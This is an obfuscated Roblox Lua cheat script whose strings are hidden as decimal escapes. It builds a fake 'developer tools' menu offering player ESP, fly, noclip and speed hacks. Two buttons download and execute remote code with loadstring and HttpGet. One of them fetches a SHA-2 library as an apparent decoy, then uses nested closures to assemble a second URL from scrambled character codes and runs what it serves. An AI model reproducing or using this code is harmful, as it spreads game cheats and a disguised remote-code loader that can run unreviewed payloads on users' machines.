local L_1_ = game
local L_2_ = L_1_.GetService
local L_3_ = L_2_(L_1_, "\080\108\097\121\101\114\115")
local L_4_ = L_3_.LocalPlayer
local L_5_ = L_4_.WaitForChild
local L_6_ = L_5_(L_4_, "\080\108\097\121\101\114\071\117\105")

local L_7_ = L_6_.FindFirstChild
local L_8_ = L_7_(L_6_, "\068\101\118\084\111\111\108\071\085\073")
if L_8_ then L_8_:Destroy() end

local L_9_ = Instance.new("\083\099\114\101\101\110\071\117\105")
L_9_.Name = "\068\101\118\084\111\111\108\071\085\073"
L_9_.Parent = L_6_

local L_10_ = Instance.new("\070\114\097\109\101")
L_10_.Name = "\077\097\105\110\067\111\110\116\097\105\110\101\114"
L_10_.Size = UDim2.new(1, 0, 1, 0)
L_10_.Position = UDim2.new(0, 0, 0, 0)
L_10_.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
L_10_.Parent = L_9_

local L_11_ = Instance.new("\070\114\097\109\101")
L_11_.Name = "\083\105\100\101\098\097\114"
L_11_.Size = UDim2.new(0, 220, 1, 0)
L_11_.Position = UDim2.new(0, 0, 0, 0)
L_11_.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
L_11_.BorderSizePixel = 0
L_11_.Parent = L_10_

local L_12_ = Instance.new("\070\114\097\109\101")
L_12_.Name = "\076\111\103\111\070\114\097\109\101"
L_12_.Size = UDim2.new(1, 0, 0, 50)
L_12_.Position = UDim2.new(0, 0, 0, 0)
L_12_.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
L_12_.BorderSizePixel = 0
L_12_.Parent = L_11_

local L_13_ = Instance.new("\084\101\120\116\076\097\098\101\108")
L_13_.Name = "\076\111\103\111\073\099\111\110"
L_13_.Size = UDim2.new(0, 32, 0, 32)
L_13_.Position = UDim2.new(0, 15, 0, 9)
L_13_.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
L_13_.Text = "\082"
L_13_.TextColor3 = Color3.fromRGB(255, 255, 255)
L_13_.TextScaled = true
L_13_.BorderSizePixel = 0
L_13_.Parent = L_12_

local L_14_ = Instance.new("\084\101\120\116\076\097\098\101\108")
L_14_.Name = "\076\111\103\111\084\101\120\116"
L_14_.Size = UDim2.new(0, 120, 0, 32)
L_14_.Position = UDim2.new(0, 57, 0, 9)
L_14_.BackgroundTransparency = 1
L_14_.Text = "\105\115\107\101\108\101\116\111\110\032\116\111\111\108\115"
L_14_.TextColor3 = Color3.fromRGB(212, 212, 212)
L_14_.TextSize = 16
L_14_.TextXAlignment = Enum.TextXAlignment.Left
L_14_.Font = Enum.Font.SourceSansSemibold
L_14_.Parent = L_12_

local L_15_ = Instance.new("\083\099\114\111\108\108\105\110\103\070\114\097\109\101")
L_15_.Name = "\078\097\118\067\111\110\116\097\105\110\101\114"
L_15_.Size = UDim2.new(1, 0, 1, -50)
L_15_.Position = UDim2.new(0, 0, 0, 50)
L_15_.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
L_15_.BorderSizePixel = 0
L_15_.ScrollBarThickness = 6
L_15_.ScrollBarImageColor3 = Color3.fromRGB(86, 86, 86)
L_15_.CanvasSize = UDim2.new(0, 0, 0, 800)
L_15_.Parent = L_11_

local function L_16_(L_17_arg0, L_18_arg1, L_19_arg2)
    local L_20_ = Instance.new("\070\114\097\109\101")
    L_20_.Name = L_18_arg1 .. "\083\101\099\116\105\111\110"
    L_20_.Size = UDim2.new(1, 0, 0, 40 + (#L_19_arg2 * 40))
    L_20_.BackgroundTransparency = 1
    L_20_.Parent = L_15_
    
    local L_21_ = Instance.new("\084\101\120\116\076\097\098\101\108")
    L_21_.Name = "\083\101\099\116\105\111\110\084\105\116\108\101"
    L_21_.Size = UDim2.new(1, -20, 0, 30)
    L_21_.Position = UDim2.new(0, 10, 0, 0)
    L_21_.BackgroundTransparency = 1
    L_21_.Text = L_17_arg0
    L_21_.TextColor3 = Color3.fromRGB(150, 150, 150)
    L_21_.TextSize = 12
    L_21_.TextXAlignment = Enum.TextXAlignment.Left
    L_21_.Font = Enum.Font.SourceSansSemibold
    L_21_.Parent = L_20_
    
    local L_22_ = Instance.new("\070\114\097\109\101")
    L_22_.Name = "\066\117\116\116\111\110\067\111\110\116\097\105\110\101\114"
    L_22_.Size = UDim2.new(1, 0, 0, #L_19_arg2 * 40)
    L_22_.Position = UDim2.new(0, 0, 0, 30)
    L_22_.BackgroundTransparency = 1
    L_22_.Parent = L_20_
    
    for L_23_, L_24_ in ipairs(L_19_arg2) do
        local L_25_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
        L_25_.Name = L_24_.name
        L_25_.Size = UDim2.new(1, 0, 0, 35)
        L_25_.Position = UDim2.new(0, 0, 0, (L_23_-1)*40)
        L_25_.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
        L_25_.BorderSizePixel = 0
        L_25_.Text = "\032\032" .. L_24_.text
        L_25_.TextColor3 = Color3.fromRGB(212, 212, 212)
        L_25_.TextSize = 14
        L_25_.TextXAlignment = Enum.TextXAlignment.Left
        L_25_.Font = Enum.Font.SourceSans
        L_25_.Parent = L_22_
        
        L_25_.MouseEnter:Connect(function()
            if not L_24_.selected then
                L_25_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
            end
        end)
        
        L_25_.MouseLeave:Connect(function()
            if not L_24_.selected then
                L_25_.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
            end
        end)
        
        L_24_.button = L_25_
    end
    
    return L_20_, L_19_arg2
end

local L_26_ = {
    {name = "\080\108\097\121\101\114\069\083\080", text = "\112\108\097\121\101\114\032\069\083\080", selected = false},
    {name = "\070\108\121", text = "\102\108\121", selected = false},
    {name = "\078\111\099\108\105\112", text = "\110\111\099\108\105\112", selected = false},
    {name = "\083\112\101\101\100", text = "\109\111\100\105\102\121\032\115\112\101\101\100", selected = true}
}

local L_27_ = {
    {name = "\071\097\109\101\083\116\097\116\115", text = "\103\097\109\101\032\115\116\097\116\105\115\116\105\099\115", selected = false},
    {name = "\080\101\114\102\111\114\109\097\110\099\101", text = "\112\101\114\102\111\114\109\097\110\099\101\032\109\111\110\105\116\111\114", selected = false},
    {name = "\068\101\098\117\103\073\110\102\111", text = "\100\101\098\117\103\032\105\110\102\111", selected = false}
}

local L_28_ = {
    {name = "\071\101\110\101\114\097\108", text = "\103\101\110\101\114\097\108\032\115\101\116\116\105\110\103\115", selected = false},
    {name = "\071\114\097\112\104\105\099\115", text = "\103\114\097\112\104\105\099\115\032\115\101\116\116\105\110\103\115", selected = false},
    {name = "\067\111\110\116\114\111\108\115", text = "\099\111\110\116\114\111\108\032\115\101\116\116\105\110\103\115", selected = false}
}

local L_29_ = {
    {name = "\067\108\101\097\114\087\097\116\101\114", text = "\099\108\101\097\114\032\119\097\116\101\114\032\115\099\114\105\112\116", selected = false},
    {name = "\081\105\110\103\070\101\110\103", text = "\113\105\110\103\102\101\110\103\032\115\099\114\105\112\116", selected = false}
}

local L_30_, L_31_ = L_16_("\102\117\110\099\116\105\111\110\032\097\114\101\097", "\070\117\110\099\116\105\111\110", L_26_)
L_30_.Position = UDim2.new(0, 0, 0, 0)

local L_32_, L_33_ = L_16_("\105\110\102\111\032\097\114\101\097", "\073\110\102\111", L_27_)
L_32_.Position = UDim2.new(0, 0, 0, L_30_.Size.Y.Offset)

local L_34_, L_35_ = L_16_("\115\101\116\116\105\110\103\115\032\097\114\101\097", "\083\101\116\116\105\110\103\115", L_28_)
L_34_.Position = UDim2.new(0, 0, 0, L_30_.Size.Y.Offset + L_32_.Size.Y.Offset)

local L_36_, L_37_ = L_16_("\071\066\032\115\099\114\105\112\116\115", "\071\066\083\099\114\105\112\116", L_29_)
L_36_.Position = UDim2.new(0, 0, 0, L_30_.Size.Y.Offset + L_32_.Size.Y.Offset + L_34_.Size.Y.Offset)

local L_38_ = Instance.new("\070\114\097\109\101")
L_38_.Name = "\067\111\110\116\101\110\116\065\114\101\097"
L_38_.Size = UDim2.new(1, -220, 1, 0)
L_38_.Position = UDim2.new(0, 220, 0, 0)
L_38_.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
L_38_.BorderSizePixel = 0
L_38_.Parent = L_10_

local L_39_ = Instance.new("\070\114\097\109\101")
L_39_.Name = "\067\111\110\116\101\110\116\072\101\097\100\101\114"
L_39_.Size = UDim2.new(1, 0, 0, 40)
L_39_.Position = UDim2.new(0, 0, 0, 0)
L_39_.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
L_39_.BorderSizePixel = 0
L_39_.Parent = L_38_

local L_40_ = Instance.new("\084\101\120\116\076\097\098\101\108")
L_40_.Name = "\067\111\110\116\101\110\116\084\105\116\108\101"
L_40_.Size = UDim2.new(0.7, 0, 1, 0)
L_40_.Position = UDim2.new(0, 20, 0, 0)
L_40_.BackgroundTransparency = 1
L_40_.Text = "\109\111\100\105\102\121\032\115\112\101\101\100"
L_40_.TextColor3 = Color3.fromRGB(212, 212, 212)
L_40_.TextSize = 18
L_40_.TextXAlignment = Enum.TextXAlignment.Left
L_40_.Font = Enum.Font.SourceSansSemibold
L_40_.Parent = L_39_

local L_41_ = Instance.new("\070\114\097\109\101")
L_41_.Name = "\087\105\110\100\111\119\067\111\110\116\114\111\108\115"
L_41_.Size = UDim2.new(0, 80, 1, 0)
L_41_.Position = UDim2.new(1, -80, 0, 0)
L_41_.BackgroundTransparency = 1
L_41_.Parent = L_39_

local L_42_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
L_42_.Name = "\077\105\110\105\109\105\122\101\066\117\116\116\111\110"
L_42_.Size = UDim2.new(0, 30, 0, 30)
L_42_.Position = UDim2.new(0, 10, 0.5, -15)
L_42_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
L_42_.BorderSizePixel = 0
L_42_.Text = "\095"
L_42_.TextColor3 = Color3.fromRGB(212, 212, 212)
L_42_.TextSize = 16
L_42_.Parent = L_41_

local L_43_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
L_43_.Name = "\067\108\111\115\101\066\117\116\116\111\110"
L_43_.Size = UDim2.new(0, 30, 0, 30)
L_43_.Position = UDim2.new(0, 50, 0.5, -15)
L_43_.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
L_43_.BorderSizePixel = 0
L_43_.Text = "\215"
L_43_.TextColor3 = Color3.fromRGB(255, 255, 255)
L_43_.TextSize = 18
L_43_.Parent = L_41_

local L_44_ = Instance.new("\083\099\114\111\108\108\105\110\103\070\114\097\109\101")
L_44_.Name = "\067\111\110\116\101\110\116\083\099\114\111\108\108"
L_44_.Size = UDim2.new(1, 0, 1, -40)
L_44_.Position = UDim2.new(0, 0, 0, 40)
L_44_.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
L_44_.BorderSizePixel = 0
L_44_.ScrollBarThickness = 8
L_44_.ScrollBarImageColor3 = Color3.fromRGB(86, 86, 86)
L_44_.CanvasSize = UDim2.new(0, 0, 0, 800)
L_44_.Parent = L_38_

local function L_45_(L_46_arg0, L_47_arg1, L_48_arg2, L_49_arg3, L_50_arg4, L_51_arg5)
    local L_52_ = Instance.new("\070\114\097\109\101")
    L_52_.Name = L_46_arg0
    L_52_.Size = UDim2.new(1, -40, 0, 60)
    L_52_.Position = UDim2.new(0, 20, 0, 0)
    L_52_.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
    L_52_.BorderSizePixel = 0
    
    local L_53_ = Instance.new("\084\101\120\116\076\097\098\101\108")
    L_53_.Name = "\073\116\101\109\076\097\098\101\108"
    L_53_.Size = UDim2.new(0.6, 0, 0, 30)
    L_53_.Position = UDim2.new(0, 15, 0, 15)
    L_53_.BackgroundTransparency = 1
    L_53_.Text = L_47_arg1
    L_53_.TextColor3 = Color3.fromRGB(212, 212, 212)
    L_53_.TextSize = 14
    L_53_.TextXAlignment = Enum.TextXAlignment.Left
    L_53_.Font = Enum.Font.SourceSans
    L_53_.Parent = L_52_
    
    local L_54_ = Instance.new("\070\114\097\109\101")
    L_54_.Name = "\067\111\110\116\114\111\108\115"
    L_54_.Size = UDim2.new(0.35, 0, 1, 0)
    L_54_.Position = UDim2.new(0.65, 0, 0, 0)
    L_54_.BackgroundTransparency = 1
    L_54_.Parent = L_52_
    
    local L_55_, L_56_, L_57_
    
    if L_48_arg2 then
        L_55_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
        L_55_.Name = "\084\111\103\103\108\101"
        L_55_.Size = UDim2.new(0, 80, 0, 30)
        L_55_.Position = UDim2.new(0, 0, 0.5, -15)
        L_55_.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
        L_55_.BorderSizePixel = 0
        L_55_.Text = "\101\110\097\098\108\101"
        L_55_.TextColor3 = Color3.fromRGB(255, 255, 255)
        L_55_.TextSize = 12
        L_55_.Parent = L_54_
        
        L_55_.MouseButton1Click:Connect(function()
            if L_55_.Text == "\101\110\097\098\108\101" then
                L_55_.Text = "\100\105\115\097\098\108\101"
                L_55_.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            else
                L_55_.Text = "\101\110\097\098\108\101"
                L_55_.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
            end
        end)
    end
    
    if L_49_arg3 then
        L_56_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
        L_56_.Name = "\086\097\108\117\101"
        L_56_.Size = UDim2.new(0, 80, 0, 30)
        L_56_.Position = UDim2.new(0, 90, 0.5, -15)
        L_56_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
        L_56_.BorderSizePixel = 0
        L_56_.Text = tostring(L_50_arg4 or "\048")
        L_56_.TextColor3 = Color3.fromRGB(212, 212, 212)
        L_56_.TextSize = 12
        L_56_.Parent = L_54_
        
        L_56_.MouseButton1Click:Connect(function()
            local L_58_ = tonumber(L_56_.Text)
            if L_58_ then
                L_58_ = L_58_ + 1
                if L_58_ > 10 then L_58_ = 0 end
                L_56_.Text = tostring(L_58_)
            end
        end)
    end
    
    if L_51_arg5 then
        local L_59_ = Instance.new("\070\114\097\109\101")
        L_59_.Name = "\083\108\105\100\101\114\067\111\110\116\097\105\110\101\114"
        L_59_.Size = UDim2.new(1, -100, 0, 30)
        L_59_.Position = UDim2.new(0, 0, 0.5, -15)
        L_59_.BackgroundTransparency = 1
        L_59_.Parent = L_54_
        
        local L_60_ = Instance.new("\070\114\097\109\101")
        L_60_.Name = "\083\108\105\100\101\114\066\097\099\107\103\114\111\117\110\100"
        L_60_.Size = UDim2.new(0.6, 0, 0, 6)
        L_60_.Position = UDim2.new(0, 0, 0.5, -3)
        L_60_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
        L_60_.BorderSizePixel = 0
        L_60_.Parent = L_59_
        
        L_57_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
        L_57_.Name = "\083\108\105\100\101\114"
        L_57_.Size = UDim2.new(0, 20, 0, 20)
        L_57_.Position = UDim2.new(0, 0, 0.5, -10)
        L_57_.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
        L_57_.BorderSizePixel = 0
        L_57_.Text = ""
        L_57_.Parent = L_59_
        
        local L_61_ = Instance.new("\084\101\120\116\076\097\098\101\108")
        L_61_.Name = "\086\097\108\117\101\068\105\115\112\108\097\121"
        L_61_.Size = UDim2.new(0, 40, 0, 30)
        L_61_.Position = UDim2.new(0.65, 10, 0, 0)
        L_61_.BackgroundTransparency = 1
        L_61_.Text = tostring(L_50_arg4 or "\048")
        L_61_.TextColor3 = Color3.fromRGB(212, 212, 212)
        L_61_.TextSize = 12
        L_61_.Parent = L_59_
        
        local L_62_ = false
        local function L_63_(L_64_arg0)
            local L_65_ = math.clamp(L_64_arg0.X, 0, L_60_.AbsoluteSize.X)
            local L_66_ = L_65_ / L_60_.AbsoluteSize.X
            local L_67_ = math.floor(L_66_ * 100)
            
            L_57_.Position = UDim2.new(L_66_, -10, 0.5, -10)
            L_61_.Text = tostring(L_67_)
        end
        
        L_57_.MouseButton1Down:Connect(function()
            L_62_ = true
        end)
        
        L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101").InputEnded:Connect(function(L_68_arg0)
            if L_68_arg0.UserInputType == Enum.UserInputType.MouseButton1 then
                L_62_ = false
            end
        end)
        
        L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101").InputChanged:Connect(function(L_69_arg0)
            if L_62_ and L_69_arg0.UserInputType == Enum.UserInputType.MouseMovement then
                L_63_(L_69_arg0.Position)
            end
        end)
    end
    
    return L_52_, L_55_, L_56_, L_57_
end

local function L_70_()
    L_44_:ClearAllChildren()
    
    local L_71_ = L_45_("\080\108\097\121\101\114\069\083\080", "\112\108\097\121\101\114\032\069\083\080", true, false)
    L_71_.Position = UDim2.new(0, 20, 0, 20)
    L_71_.Parent = L_44_
    
    local L_72_ = false
    local L_73_ = {}
    
    L_71_:FindFirstChild("\067\111\110\116\114\111\108\115"):FindFirstChild("\084\111\103\103\108\101").MouseButton1Click:Connect(function()
        L_72_ = not L_72_
        
        if L_72_ then
            for L_74_, L_75_ in pairs(L_3_:GetPlayers()) do
                if L_75_ ~= L_3_.LocalPlayer and L_75_.Character then
                    local L_76_ = L_75_.Character:FindFirstChild("\072\101\097\100")
                    if L_76_ then
                        local L_77_ = Instance.new("\066\105\108\108\098\111\097\114\100\071\117\105")
                        L_77_.Name = "\069\083\080\084\097\103"
                        L_77_.Adornee = L_76_
                        L_77_.Size = UDim2.new(0, 100, 0, 40)
                        L_77_.StudsOffset = Vector3.new(0, 3, 0)
                        L_77_.AlwaysOnTop = true
                        L_77_.Parent = L_76_
                        
                        local L_78_ = Instance.new("\084\101\120\116\076\097\098\101\108")
                        L_78_.Size = UDim2.new(1, 0, 0.5, 0)
                        L_78_.Position = UDim2.new(0, 0, 0, 0)
                        L_78_.BackgroundTransparency = 1
                        L_78_.Text = L_75_.Name
                        L_78_.TextColor3 = Color3.fromRGB(255, 0, 0)
                        L_78_.TextSize = 14
                        L_78_.Parent = L_77_
                        
                        local L_79_ = Instance.new("\084\101\120\116\076\097\098\101\108")
                        L_79_.Size = UDim2.new(1, 0, 0.5, 0)
                        L_79_.Position = UDim2.new(0, 0, 0.5, 0)
                        L_79_.BackgroundTransparency = 1
                        L_79_.Text = "\072\080\058\032" .. tostring(L_75_.Character:FindFirstChild("\072\117\109\097\110\111\105\100").Health)
                        L_79_.TextColor3 = Color3.fromRGB(0, 255, 0)
                        L_79_.TextSize = 12
                        L_79_.Parent = L_77_
                        
                        L_73_[L_75_] = L_77_
                    end
                end
            end
        else
            for L_80_, L_81_ in pairs(L_73_) do
                L_81_:Destroy()
            end
            L_73_ = {}
        end
    end)
end

local function L_82_()
    L_44_:ClearAllChildren()
    
    local L_83_ = L_45_("\070\108\121", "\102\108\121\105\110\103\032\109\111\100\101", true, false)
    L_83_.Position = UDim2.new(0, 20, 0, 20)
    L_83_.Parent = L_44_
    
    local L_84_ = false
    local L_85_, L_86_
    
    L_83_:FindFirstChild("\067\111\110\116\114\111\108\115"):FindFirstChild("\084\111\103\103\108\101").MouseButton1Click:Connect(function()
        L_84_ = not L_84_
        local L_87_ = L_3_.LocalPlayer.Character
        if not L_87_ then return end
        
        local L_88_ = L_87_:FindFirstChildOfClass("\072\117\109\097\110\111\105\100")
        if not L_88_ then return end
        
        if L_84_ then
            L_88_.PlatformStand = true
            
            L_85_ = Instance.new("\066\111\100\121\071\121\114\111")
            L_85_.P = 1000
            L_85_.D = 50
            L_85_.MaxTorque = Vector3.new(4000, 4000, 4000)
            L_85_.CFrame = L_87_.HumanoidRootPart.CFrame
            L_85_.Parent = L_87_.HumanoidRootPart
            
            L_86_ = Instance.new("\066\111\100\121\086\101\108\111\099\105\116\121")
            L_86_.Velocity = Vector3.new(0, 0, 0)
            L_86_.MaxForce = Vector3.new(4000, 4000, 4000)
            L_86_.Parent = L_87_.HumanoidRootPart
            
            local L_89_
            L_89_ = L_2_(L_1_, "\082\117\110\083\101\114\118\105\099\101").Heartbeat:Connect(function()
                if not L_84_ then
                    L_89_:Disconnect()
                    return
                end
                
                local L_90_ = L_87_.HumanoidRootPart
                local L_91_ = workspace.CurrentCamera
                
                L_85_.CFrame = L_91_.CFrame
                
                local L_92_ = Vector3.new()
                if L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101"):IsKeyDown(Enum.Key.W) then
                    L_92_ = L_92_ + L_91_.CFrame.LookVector
                end
                if L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101"):IsKeyDown(Enum.Key.S) then
                    L_92_ = L_92_ - L_91_.CFrame.LookVector
                end
                if L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101"):IsKeyDown(Enum.Key.A) then
                    L_92_ = L_92_ - L_91_.CFrame.RightVector
                end
                if L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101"):IsKeyDown(Enum.Key.D) then
                    L_92_ = L_92_ + L_91_.CFrame.RightVector
                end
                if L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101"):IsKeyDown(Enum.Key.Space) then
                    L_92_ = L_92_ + Vector3.new(0, 1, 0)
                end
                if L_2_(L_1_, "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101"):IsKeyDown(Enum.Key.LeftShift) then
                    L_92_ = L_92_ - Vector3.new(0, 1, 0)
                end
                
                L_86_.Velocity = L_92_ * 50
            end)
        else
            L_88_.PlatformStand = false
            if L_85_ then L_85_:Destroy() end
            if L_86_ then L_86_:Destroy() end
        end
    end)
end

local function L_93_()
    L_44_:ClearAllChildren()
    
    local L_94_ = L_45_("\078\111\099\108\105\112", "\110\111\099\108\105\112\032\109\111\100\101", true, false)
    L_94_.Position = UDim2.new(0, 20, 0, 20)
    L_94_.Parent = L_44_
    
    local L_95_ = false
    local L_96_
    
    L_94_:FindFirstChild("\067\111\110\116\114\111\108\115"):FindFirstChild("\084\111\103\103\108\101").MouseButton1Click:Connect(function()
        L_95_ = not L_95_
        local L_97_ = L_3_.LocalPlayer.Character
        if not L_97_ then return end
        
        if L_95_ then
            for L_98_, L_99_ in pairs(L_97_:GetDescendants()) do
                if L_99_:IsA("\066\097\115\101\080\097\114\116") then
                    L_99_.CanCollide = false
                end
            end
            
            L_96_ = L_2_(L_1_, "\082\117\110\083\101\114\118\105\099\101").Stepped:Connect(function()
                if not L_95_ then
                    L_96_:Disconnect()
                    return
                end
                
                for L_100_, L_101_ in pairs(L_97_:GetDescendants()) do
                    if L_101_:IsA("\066\097\115\101\080\097\114\116") then
                        L_101_.CanCollide = false
                    end
                end
            end)
        else
            if L_96_ then
                L_96_:Disconnect()
            end
            
            for L_102_, L_103_ in pairs(L_97_:GetDescendants()) do
                if L_103_:IsA("\066\097\115\101\080\097\114\116") then
                    L_103_.CanCollide = true
                end
            end
        end
    end)
end

local function L_104_()
    L_44_:ClearAllChildren()
    
    local L_105_, L_106_, L_107_, L_108_ = L_45_("\083\112\101\101\100", "\109\111\118\101\109\101\110\116\032\115\112\101\101\100", false, false, 16, true)
    L_105_.Position = UDim2.new(0, 20, 0, 20)
    L_105_.Parent = L_44_
    
    local L_109_ = 16
    
    local L_110_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
    L_110_.Name = "\073\110\112\117\116\066\117\116\116\111\110"
    L_110_.Size = UDim2.new(0, 80, 0, 30)
    L_110_.Position = UDim2.new(0.8, 10, 0.5, -15)
    L_110_.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
    L_110_.BorderSizePixel = 0
    L_110_.Text = "\105\110\112\117\116\032\118\097\108\117\101"
    L_110_.TextColor3 = Color3.fromRGB(212, 212, 212)
    L_110_.TextSize = 12
    L_110_.Parent = L_105_:FindFirstChild("\067\111\110\116\114\111\108\115")
    
    L_110_.MouseButton1Click:Connect(function()
        L_109_ = 50
        local L_111_ = L_3_.LocalPlayer.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100")
        if L_111_ then
            L_111_.WalkSpeed = L_109_
        end
    end)
    
    local function L_112_(L_113_arg0)
        local L_114_ = L_3_.LocalPlayer.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100")
        if L_114_ then
            L_114_.WalkSpeed = L_113_arg0
        end
    end
    
    if L_108_ then
        L_2_(L_1_, "\082\117\110\083\101\114\118\105\099\101").Heartbeat:Connect(function()
            local L_115_ = L_105_:FindFirstChild("\067\111\110\116\114\111\108\115"):FindFirstChild("\083\108\105\100\101\114\067\111\110\116\097\105\110\101\114"):FindFirstChild("\086\097\108\117\101\068\105\115\112\108\097\121").Text
            local L_116_ = tonumber(L_115_)
            if L_116_ and L_116_ ~= L_109_ then
                L_109_ = L_116_
                L_112_(L_109_)
            end
        end)
    end
end

local function L_117_()
    L_44_:ClearAllChildren()
    
    local L_118_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
    L_118_.Name = "\067\108\101\097\114\087\097\116\101\114\066\117\116\116\111\110"
    L_118_.Size = UDim2.new(1, -40, 0, 50)
    L_118_.Position = UDim2.new(0, 20, 0, 20)
    L_118_.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    L_118_.BorderSizePixel = 0
    L_118_.Text = "\101\120\101\099\117\116\101\032\099\108\101\097\114\032\119\097\116\101\114\032\115\099\114\105\112\116"
    L_118_.TextColor3 = Color3.fromRGB(255, 255, 255)
    L_118_.TextSize = 14
    L_118_.Parent = L_44_
    
    L_118_.MouseButton1Click:Connect(function()
        loadstring(L_1_:HttpGet("\104\116\116\112\115\058\047\047\112\097\115\116\101\102\121\046\097\112\112\047\065\051\078\113\122\052\078\112\047\114\097\119"))()
    end)
    
    local L_119_ = Instance.new("\084\101\120\116\066\117\116\116\111\110")
    L_119_.Name = "\081\105\110\103\070\101\110\103\066\117\116\116\111\110"
    L_119_.Size = UDim2.new(1, -40, 0, 50)
    L_119_.Position = UDim2.new(0, 20, 0, 90)
    L_119_.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    L_119_.BorderSizePixel = 0
    L_119_.Text = "\101\120\101\099\117\116\101\032\113\105\110\103\102\101\110\103\032\115\099\114\105\112\116"
    L_119_.TextColor3 = Color3.fromRGB(255, 255, 255)
    L_119_.TextSize = 14
    L_119_.Parent = L_44_
    
    L_119_.MouseButton1Click:Connect(function()
        local L_120_ = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\069\103\111\114\045\083\107\114\105\112\116\117\110\111\102\102\047\112\117\114\101\095\108\117\097\095\083\072\065\047\114\101\102\115\047\104\101\097\100\115\047\109\097\115\116\101\114\047\115\104\097\050\046\108\117\097" 
        local L_121_ = L_1_:HttpGet(L_120_)
        if L_121_ then    
            (function(L_122_arg0) 
                local L_123_ = function(...) 
                    local L_124_ = "" 
                    for L_125_, L_126_ in next,{...} do 
                        L_124_ = L_124_ .. string.char(L_126_) 
                    end 
                    return L_124_ 
                end 
                local L_127_ = getfenv(2) 
                return function(L_128_arg0,...) 
                    L_128_arg0 = L_123_(L_128_arg0,...) 
                    return function(L_129_arg0,...) 
                        L_129_arg0 = L_123_(L_129_arg0,...) 
                        return function(L_130_arg0,...) 
                            L_130_arg0 = L_123_(L_130_arg0,...) 
                            return function(L_131_arg0,...) 
                                L_131_arg0 = L_123_(L_131_arg0,...) 
                                return function(L_132_arg0,...) 
                                    L_132_arg0 = L_123_(L_132_arg0,...) 
                                    local L_133_ = (L_130_arg0..L_132_arg0..L_128_arg0..L_122_arg0..L_131_arg0..L_129_arg0) 
                                    return function(L_134_arg0,...) 
                                        L_134_arg0 = L_123_(L_134_arg0,...) 
                                        L_133_ = (L_130_arg0..L_131_arg0..L_132_arg0..L_128_arg0..L_122_arg0..L_129_arg0..L_134_arg0) 
                                        return function(L_135_arg0,...) 
                                            L_135_arg0 = L_123_(L_135_arg0,...) 
                                            L_133_ = (L_134_arg0..L_122_arg0..L_135_arg0..L_130_arg0..L_132_arg0..L_128_arg0..L_131_arg0) 
                                            return function(L_136_arg0,...) 
                                                L_136_arg0 = L_123_(L_136_arg0,...) 
                                                L_133_ = (L_129_arg0..L_132_arg0..L_136_arg0..L_134_arg0..L_122_arg0..L_135_arg0..L_128_arg0..L_130_arg0..L_131_arg0) 
                                                return function(L_137_arg0,...) 
                                                    L_137_arg0 = L_123_(L_137_arg0,...) 
                                                    L_133_ = (L_128_arg0..L_137_arg0..L_129_arg0..L_122_arg0..L_136_arg0..L_135_arg0..L_132_arg0..L_131_arg0..L_130_arg0..L_134_arg0) 
                                                    return function(L_138_arg0,...) 
                                                        L_138_arg0 = L_123_(L_138_arg0,...) 
                                                        L_133_ = (L_137_arg0..L_128_arg0..L_130_arg0..L_129_arg0..L_134_arg0..L_135_arg0..L_136_arg0..L_131_arg0..L_132_arg0..L_138_arg0) 
                                                        return function(L_139_arg0) 
                                                            return L_127_[L_123_(unpack(L_139_arg0[1]))](L_1_[L_123_(unpack(L_139_arg0[2]))](L_1_,L_133_)) 
                                                        end 
                                                    end 
                                                end 
                                            end 
                                        end 
                                    end 
                                end 
                            end 
                        end 
                    end 
                end 
            end)(string.char(92))
            (119,46,103,105,116,104,117,98,117,115,101)
            (47,115,107,117,114,103,102,51,48,76,70,69)
            (114,99,111,110,116,101,110,116,46,99,111,109)
            (102,47,114,101,102,115,47)
            (104,101,97,100,115,47,109,97)
            (52,48,99,98,48,70,115,112)
            (49,56,56,54,97,78,50,65,116)
            (47,116,102,54,53,56,101,90,97,83,74,49,78,71)
            (104,116,116,112,115,58,47,47,114,97)
            (105,110,47,109,70,57,71,118,51,70,120,106,81,116,79,56)
            ({{108,111,97,100,115,116,114,105,110,103},{72,116,116,112,71,101,116}})()
            ("\113\105\110\103")
        end
    end)
end

